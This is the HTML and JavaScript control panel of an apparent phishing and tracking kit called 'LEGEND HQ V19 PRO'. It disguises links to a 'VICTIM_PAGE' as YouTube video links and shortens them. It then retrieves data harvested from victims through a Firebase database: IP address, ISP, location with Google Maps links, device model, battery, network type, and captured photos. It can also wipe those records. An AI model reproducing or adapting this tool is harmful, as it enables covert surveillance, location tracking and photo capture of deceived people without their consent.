<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LEGEND HQ | V19 PRO</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');
        body { background: #f4f7f6; font-family: 'Poppins', sans-serif; margin: 0; padding: 15px; color: #333; }
        .container { max-width: 500px; margin: auto; }
        .card { background: white; padding: 25px; border-radius: 25px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); margin-bottom: 15px; }
        h1 { color: #cc0000; font-size: 1.2rem; text-align: center; margin-top: 0; }
        input { width: 100%; padding: 12px; border: 1px solid #eee; border-radius: 12px; margin-bottom: 10px; box-sizing: border-box; outline: none; background: #fafafa; }
        .btn { width: 100%; padding: 12px; border: none; border-radius: 12px; background: #00a884; color: white; font-weight: bold; cursor: pointer; margin-bottom: 8px; font-size: 14px; transition: 0.3s; }
        .btn:active { transform: scale(0.97); }
        .log-card { background: white; padding: 15px; border-radius: 20px; margin-top: 10px; border-left: 6px solid #cc0000; font-size: 0.8rem; box-shadow: 0 4px 15px rgba(0,0,0,0.03); }
        .snap-img { width: 100%; border-radius: 12px; margin-top: 10px; border: 1px solid #eee; }
        .badge { background: #f0f2f5; padding: 4px 10px; border-radius: 8px; display: inline-block; margin: 3px; font-weight: 600; font-size: 11px; }
        .link-box { background: #e8f5f2; color: #00a884; padding: 12px; border-radius: 12px; font-size: 0.75rem; word-break: break-all; margin-top: 10px; display: none; text-align: center; border: 1px dashed #00a884; }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <h1>LEGEND HQ V19 PRO</h1>
            <input type="text" id="masterKey" placeholder="Enter Secret Key">
            <input type="text" id="targetUrl" placeholder="Video Link (YouTube)">
            <button class="btn" onclick="generateLink()">GENERATE & COPY LINK</button>
            <div id="linkArea" class="link-box" onclick="copyText()"></div>
        </div>

        <div style="display: flex; gap: 8px;">
            <button class="btn" style="background:#333;" onclick="fetchData('tracking')">DETAILS</button>
            <button class="btn" style="background:#cc0000;" onclick="fetchData('photos')">SNAPS</button>
            <button class="btn" style="background:#007bff;" onclick="clearAll()">DELETE</button>
        </div>

        <div id="displayArea"></div>
    </div>

    <script>
        const DB_URL = "https://location-5d435-default-rtdb.firebaseio.com/";
        const VICTIM_PAGE = "https://video-obtg.vercel.app/"; // Change this to your URL

        async function generateLink() {
            const k = document.getElementById('masterKey').value;
            const r = document.getElementById('targetUrl').value;
            if(!k || !r) return alert("Keys and URL are required!");
            const longLink = `${VICTIM_PAGE}?id=${btoa(JSON.stringify({k, r}))}`;
            try {
                const res = await fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(longLink)}`);
                const short = await res.text();
                const area = document.getElementById('linkArea');
                area.innerText = short;
                area.style.display = 'block';
                navigator.clipboard.writeText(short);
                alert("Link Copied!");
            } catch(e) { alert("Error generating short link."); }
        }

        async function fetchData(path) {
            const key = document.getElementById('masterKey').value;
            const res = await fetch(`${DB_URL}${path}/${key}.json`);
            const data = await res.json();
            const area = document.getElementById('displayArea');
            area.innerHTML = "";
            if(!data) return area.innerHTML = "<p style='text-align:center;'>No Data.</p>";

            Object.keys(data).reverse().forEach(id => {
                const item = data[id];
                if(path === 'photos') {
                    area.innerHTML += `<div class="log-card"><b>🕒 ${item.time}</b><img src="${item.photo}" class="snap-img"></div>`;
                } else {
                    area.innerHTML += `<div class="log-card">
                        <b>🕒 ${item.time}</b><br>
                        <span class="badge">🌐 IP: ${item.ip}</span> <img src="${item.flag}" width="18"><br>
                        <span class="badge">📡 ISP: ${item.isp}</span><br>
                        <span class="badge">📍 ${item.loc}</span><br>
                        <span class="badge">📱 ${item.model}</span> <span class="badge">🔋 ${item.battery}</span><br>
                        <span class="badge">📶 Net: ${item.network}</span><br>
                        <a href="${item.map}" target="_blank" style="color:#cc0000; font-weight:bold; text-decoration:none; display:block; margin-top:10px;">📍 OPEN IN GOOGLE MAPS</a>
                    </div>`;
                }
            });
        }

        async function clearAll() {
            const key = document.getElementById('masterKey').value;
            if(!key || !confirm("Delete all data?")) return;
            await fetch(`${DB_URL}tracking/${key}.json`, { method: 'DELETE' });
            await fetch(`${DB_URL}photos/${key}.json`, { method: 'DELETE' });
            alert("Data Cleared!");
            document.getElementById('displayArea').innerHTML = "";
        }
    </script>
</body>
</html>
